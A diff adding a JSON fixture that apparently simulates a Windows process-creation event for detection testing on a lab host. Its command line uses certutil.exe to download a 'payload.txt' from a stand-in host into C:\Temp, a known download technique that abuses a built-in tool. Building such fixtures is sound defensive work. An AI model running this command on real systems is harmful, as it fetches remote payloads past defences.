@@ -1,0 +1,11 @@
+{
+  "event_type": "process_creation",
+  "platform": "windows",
+  "process": {
+    "name": "certutil.exe",
+    "command_line": "certutil.exe -urlcache -split -f https://example.invalid/payload.txt C:\\Temp\\payload.txt"
+  },
+  "user": "lab-user",
+  "host": "lab-windows",
+  "simulation": "certutil_download"
+}
